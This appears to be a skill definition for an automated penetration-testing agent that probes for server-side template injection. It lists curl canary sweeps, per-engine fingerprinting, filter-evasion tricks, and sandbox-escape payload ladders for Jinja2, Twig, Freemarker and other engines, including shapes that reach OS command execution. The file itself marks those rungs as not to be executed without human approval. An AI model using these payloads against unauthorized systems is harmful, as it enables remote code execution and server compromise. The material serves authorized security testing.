---
name: ssti_probe
agent: agent5_injection
description: Server-side template injection — per-engine fingerprinting (Jinja2/Twig/Freemarker/Smarty/ERB) and sandbox-escape ladders with math-first canaries.
---

# SSTI Probe

## Purpose

Detects server-side template injection in names, emails, PDF generators, CMS pages, error pages, and notification templates — anywhere user input is rendered server-side. SSTI is missed because testers inject `{{7*7}}` once into one field and stop. This skill fingerprints the exact engine first (each engine has a different escape ladder), then climbs the ladder one rung at a time with math canaries before touching anything dangerous. Real impact: remote code execution via sandbox escapes (Jinja2, Twig, Freemarker all have documented paths), leading to full server compromise.

## Division of labor

- **Consumes:** parameter inventory from `agent2_mapping`, tech-stack signals from `agent1_recon` (Python/Flask/Django → Jinja2; PHP/Symfony → Twig; Java → Freemarker/Velocity/Thymeleaf; Ruby → ERB/Slim; Node → EJS/Pug/Handlebars).
- **Produces:** `findings/ssti_probe.md` — per-field engine fingerprint + verdict table with raw pairs. Finished artifact; `agent9_chaining` consumes CONFIRMED RCE-context rows.

## When to use / when NOT to use

- **Use when:** input is reflected in server-rendered pages — profile names, "hello {name}" emails, PDF/invoice generation, CMS content, custom error pages, preview features. Stack signals point at a template engine.
- **Skip when (time-pass filter):** reflection is purely client-side (view-source shows the raw `{{7*7}}` in HTML and it never evaluates — check by viewing source, not just the rendered page); the field is length-capped below useful payload size and no shorter engine probe fits; the app is a pure static SPA with no server rendering (verify via `agent1_recon` stack notes first).

## Methodology

1. **List template-rendered fields.** For each reflected input, determine WHERE it renders: same-response page, email body, PDF, error page, admin preview. Different render points = different engines sometimes.
2. **Math canary, engine-agnostic.** Inject `{{7*7}}` and `${7*7}` and `#{7*7}` and `<%= 7*7 %>`. If the response contains `49`, you have template evaluation — note WHICH syntax evaluated. If it contains the literal `{{7*7}}`, that syntax is not evaluated (try the others).
3. **Fingerprint the engine.** Send engine-specific probes and read the error/output:
   - Jinja2 (Python): `{{7*'7'}}` → `7777777`; `{{config}}` or `{{self}}` may leak objects.
   - Twig (PHP): `{{7*'7'}}` → `49` (Twig casts differently — use `{{['a','b']|join(',')}}` → `a,b`).
   - Freemarker (Java): `${7*7}` → `49`; `${"freemarker.template.utility.Execute"?new()}` is the dangerous rung (do NOT run it yet).
   - Smarty (PHP): `{7*7}` → `49`; `{$smarty.version}` leaks version.
   - ERB (Ruby): `<%= 7*7 %>` → `49`.
   - Thymeleaf (Java): `[[${7*7}]]` → `49`.
   - Handlebars (Node): `{{7*7}}` renders literally (logic-less) — try `{{constructor.constructor}}` probe shape instead.
   Record the engine with the evidence that identified it. Wrong engine = wrong ladder = wasted run.
4. **Confirm evaluation context depth.** `{{7*7}}` evaluating in a username field that renders on the profile page is stored SSTI — test whether it ALSO evaluates in emails/notifications (higher impact, different reviewers).
5. **Read-only object access (safe rungs).** Jinja2: `{{request}}`, `{{config}}`, `{{self._TemplateReference__context}}`. Twig: `{{_self}}`, `{{app}}`. These leak internals without executing code — CONFIRMED SSTI at this rung is enough for a valid finding.
6. **Sandbox-escape ladder (one rung at a time, benign commands only).** Only climb if steps 2–5 confirmed evaluation:
   - Jinja2 ladder: `{{''.__class__}}` → `{{''.__class__.__mro__}}` → subclasses → look for `subprocess.Popen` INDEX (do not call it yet) → benign proof: read `{{config}}` fully or evaluate `{{7*7}}` in a privileged context.
   - Twig ladder: `{{_self.env}}` → filter/code execution via `{{['id']|map('system')}}` — STOP before executing; the map-to-system shape is the proof of RCE context.
   - Freemarker: `?new()` on `freemarker.template.utility.Execute` — do NOT instantiate; the error message confirming the class resolves is sufficient evidence of the RCE rung.
   - Document the highest rung REACHED, and mark the RCE rung as "reachable, not executed" — executing OS commands is a human-approved chaining step.
7. **Filter/WAF evasion.** If `{{` is stripped: try `${}`, `#{`, `{%`, Smarty `{* *}` comment smuggling, unicode variants, and splitting across two fields that concatenate server-side. Each attempt logged with response.
8. **Blind SSTI.** If output isn't reflected: use time (`{{config.__class__}}` won't sleep — instead try engine-specific sleep via the escape ladder's benign rung, e.g. Jinja2 `{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}` is NOT benign — use DNS callback instead: `{{''.__class__.__mro__[1].__subclasses__()}}` shape with a URL fetch if `urllib` is reachable, else mark INCONCLUSIVE and hand to human).
9. **Email/PDF second-order.** Submit the payload in the profile, then trigger the email/PDF/export that renders it. The render happens in a different context — re-fingerprint there.
10. **Verdict per field.** CONFIRMED = math evaluates 2x, or object access leaks internals. RCE-CONTEXT = escape ladder rung reached with evidence. NEGATIVE = all syntaxes literal + evasion ladder exhausted.

## Exact commands

Engine-agnostic canary sweep:
```bash
for p in '{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>' '{7*7}' '[[${7*7}]]'; do
  echo "=== payload: $p ==="
  curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d "{\"name\":\"$p\"}" | grep -a -o -m1 '49\|7777777\|'"$p" | head -2
done
```

Jinja2 fingerprint pair:
```bash
curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d '{"name":"{{7*7}}"}' | grep -a -o '49' | head -1
curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d '{"name":"{{7*7}}"}' | grep -a -o '{{7\*7}}' | head -1
```

Twig join probe:
```bash
curl -s --get '<TARGET>/hello' --data-urlencode "name={{['a','b']|join(',')}}" | grep -a -o 'a,b' | head -1
```

Freemarker probe:
```bash
curl -s --get '<TARGET>/hello' --data-urlencode 'name=${7*7}' | grep -a -o '49' | head -1
```

Smarty version leak (read-only):
```bash
curl -s --get '<TARGET>/hello' --data-urlencode 'name={$smarty.version}' | grep -a -oiE 'smarty[^<"]{0,20}' | head -3
```

Jinja2 safe object-access rung:
```bash
curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d '{"name":"{{config}}"}' | grep -a -oiE 'secret|key|debug|env' | head -5
```

Second-order check (submit, then render):
```bash
curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' -d '{"name":"{{7*7}}_canary"}' -b 'session=<COOKIE>' -o /dev/null
curl -s '<TARGET>/profile' -b 'session=<COOKIE>' | grep -a -o '49_canary' | head -1
```

## Per-engine ladder reference

**Jinja2 (Python/Flask/Django):**
1. `{{7*7}}` → `49` (evaluation)
2. `{{7*'7'}}` → `7777777` (confirms Jinja2 string semantics vs Twig)
3. `{{config}}` / `{{request}}` (read-only internals — often leaks SECRET_KEY)
4. `{{self._TemplateReference__context.cycler.__init__}}` (object graph entry)
5. `{{cycler.__init__.__globals__.os}}` shape — document reachability, do NOT call `popen`

**Twig (PHP/Symfony):**
1. `{{7*7}}` → `49`
2. `{{['a','b']|join(',')}}` → `a,b` (confirms Twig filter semantics)
3. `{{_self.env}}` / `{{app.request}}` (read-only internals)
4. `{{['id']|map('system')}}` shape — the RCE rung; document, do NOT execute

**Freemarker (Java):**
1. `${7*7}` → `49`
2. `${.version}` (read-only version leak)
3. `${"freemarker.template.utility.Execute"?new()}` — class resolution in the error message is the evidence; do NOT instantiate

**Smarty (PHP):**
1. `{7*7}` → `49`
2. `{$smarty.version}` (version leak)
3. `{php}...{/php}` (only on Smarty < 4 with php tags enabled — usually disabled; a 500 vs silent-ignore differential tells you)

**ERB (Ruby):**
1. `<%= 7*7 %>` → `49`
2. `<%= self %>` (read-only object leak)

**Thymeleaf (Java/Spring):**
1. `[[${7*7}]]` → `49` (natural template mode)
2. `__${7*7}__` (preprocessing syntax — try when the first fails)

**Tornado (Python):** `{{7*7}}` → `49`, then `{% import os %}` shape — document, do not import-and-execute.

**Sandbox tells:** if `{{config}}` returns empty but `{{7*7}}` evaluates, you're in a sandboxed env — the escape ladder (step 6) is the only path up; if even `{{7*'7'}}` fails while `{{7*7}}` works, filters are stripping quotes — try the filter-evasion step before the ladder.

## Completion-bias defenses

- [ ] Every reflected field tested, not just the obvious name field
- [ ] All six syntax families tried per field before any verdict
- [ ] Engine identified by differential evidence, not assumed from stack
- [ ] Stored vs reflected context distinguished per field
- [ ] Read-only object-access rung attempted before any escape ladder
- [ ] Escape ladder climbed one rung at a time with evidence per rung
- [ ] No OS command executed — RCE rung marked "reachable, not executed"
- [ ] Evasion ladder run before NEGATIVE on filtered fields
- [ ] Email/PDF second-order render checked where applicable
- [ ] `findings/ssti_probe.md` exists with fingerprint + verdict table
- **Review step:** agent10_review must verify (a) the `49`/engine-specific output appears in saved responses twice, (b) the engine fingerprint evidence matches the claimed engine, (c) no OS command was executed via the escape ladder.
- **Nudge prompts:**
  - "Keep going until all six syntax families are tested on every reflected field — the engine you didn't try is the one that's vulnerable."
  - "Fingerprint first, ladder second. An escape payload for the wrong engine proves nothing."
  - "Do not report done before findings/ssti_probe.md exists on disk."
- **Finished artifact definition:** `findings/ssti_probe.md` — per-field table (field, render point, syntax results, engine, highest rung, verdict) + raw pairs.

## Evidence standard

- Baseline: literal-reflection response saved (the `{{7*7}}`-as-text case) to distinguish evaluation from echo.
- Reproduction: math evaluation reproduced 2x; object-access leak reproduced 2x.
- Raw evidence: full request and the response excerpt showing `49` or leaked internals.
- Verdicts: CONFIRMED (evaluation 2x) / RCE-CONTEXT (escape rung evidenced, not executed) / INCONCLUSIVE (evaluation once, or blind-suspect) / NEGATIVE (all syntaxes literal + evasion exhausted).

## Handoffs

- `agent9_chaining`: consumes RCE-CONTEXT rows — human-approved escalation to actual command execution and impact demonstration.
- `command_injection`: shares context — SSTI RCE rungs often become OS command execution; coordinate proof boundaries.
- `agent10_review`: consumes `findings/ssti_probe.md` — verifies no OS command ran before shipping.
